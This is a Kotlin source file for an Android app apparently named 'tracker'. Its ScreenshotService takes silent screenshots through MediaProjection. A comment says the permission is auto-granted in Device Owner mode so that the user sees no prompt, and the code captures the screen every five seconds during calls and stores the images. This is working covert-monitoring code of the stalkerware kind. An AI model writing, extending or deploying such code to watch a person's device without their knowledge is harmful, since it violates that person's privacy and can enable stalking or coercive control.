package com.tracker.app.services

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import java.io.File
import java.io.FileOutputStream
import java.util.*

/**
 * Handles silent screenshot capture using Android's MediaProjection API.
 * 
 * In Device Owner mode, the MediaProjection permission can be auto-granted,
 * so no user prompt is needed after initial setup.
 */
class ScreenshotService(private val context: Context) {

    companion object {
        private const val TAG = "ScreenshotService"
        var mediaProjection: MediaProjection? = null
        var resultCode: Int = 0
        var resultData: Intent? = null
    }

    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val handler = Handler(Looper.getMainLooper())

    // Timer for call-mode screenshots (every 5 seconds)
    private var callTimer: Timer? = null
    private val callScreenshots = mutableListOf<File>()
    private val callCapturedTimes = mutableListOf<Long>()
    private var currentCallSessionId: String? = null

    /**
     * Initialize MediaProjection from saved result (set during initial setup).
     */
    fun initProjection() {
        if (resultData == null) {
            Log.e(TAG, "No MediaProjection result data available")
            return
        }

        val projectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = projectionManager.getMediaProjection(resultCode, resultData!!)
        Log.d(TAG, "MediaProjection initialized")
    }

    /**
     * Take a single silent screenshot and return the file path.
     */
    fun captureScreenshot(): File? {
        if (mediaProjection == null) {
            initProjection()
        }

        val projection = mediaProjection ?: return null

        try {
            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val display = windowManager.defaultDisplay
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            display.getRealMetrics(metrics)

            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val density = metrics.densityDpi

            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)

            virtualDisplay = projection.createVirtualDisplay(
                "ScreenCapture",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader!!.surface,
                null, handler
            )

            // Wait briefly for the display to render
            Thread.sleep(300)

            val image = imageReader?.acquireLatestImage()
            if (image != null) {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * width

                val bitmap = Bitmap.createBitmap(
                    width + rowPadding / pixelStride,
                    height,
                    Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)
                image.close()

                // Crop to actual screen size
                val croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height)
                if (croppedBitmap != bitmap) bitmap.recycle()

                // Save as compressed WebP
                val file = saveAsWebP(croppedBitmap)
                croppedBitmap.recycle()

                cleanup()
                return file
            }

            cleanup()
            return null
        } catch (e: Exception) {
            Log.e(TAG, "Screenshot capture error: ${e.message}")
            cleanup()
            return null
        }
    }

    /**
     * Start taking screenshots every 5 seconds during a call.
     */
    fun startCallScreenshots(source: String) {
        currentCallSessionId = UUID.randomUUID().toString()
        callScreenshots.clear()
        callCapturedTimes.clear()

        Log.d(TAG, "Starting call screenshots for: $source (session: $currentCallSessionId)")

        callTimer = Timer()
        callTimer?.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                val file = captureScreenshot()
                if (file != null) {
                    synchronized(callScreenshots) {
                        callScreenshots.add(file)
                        callCapturedTimes.add(System.currentTimeMillis())
                    }
                    Log.d(TAG, "Call screenshot ${callScreenshots.size} captured")
                }
            }
        }, 0, 5000) // Every 5 seconds
    }

    /**
     * Stop the call screenshot timer and return all captured files.
     */
    fun stopCallScreenshots(): CallScreenshotResult {
        callTimer?.cancel()
        callTimer = null

        val result = CallScreenshotResult(
            files = ArrayList(callScreenshots),
            capturedTimes = ArrayList(callCapturedTimes),
            sessionId = currentCallSessionId ?: ""
        )

        Log.d(TAG, "Call screenshots stopped. Total: ${result.files.size}")

        callScreenshots.clear()
        callCapturedTimes.clear()
        currentCallSessionId = null

        return result
    }

    /**
     * Save bitmap as compressed WebP file.
     */
    private fun saveAsWebP(bitmap: Bitmap): File {
        val dir = File(context.cacheDir, "screenshots")
        dir.mkdirs()

        val file = File(dir, "scr_${System.currentTimeMillis()}.webp")
        FileOutputStream(file).use { out ->
            @Suppress("DEPRECATION")
            bitmap.compress(Bitmap.CompressFormat.WEBP, 40, out)
            out.flush()
        }

        Log.d(TAG, "Screenshot saved: ${file.absolutePath} (${file.length() / 1024} KB)")
        return file
    }

    private fun cleanup() {
        virtualDisplay?.release()
        virtualDisplay = null
        imageReader?.close()
        imageReader = null
    }

    fun destroy() {
        callTimer?.cancel()
        cleanup()
        mediaProjection?.stop()
        mediaProjection = null
    }
}

data class CallScreenshotResult(
    val files: List<File>,
    val capturedTimes: List<Long>,
    val sessionId: String
)
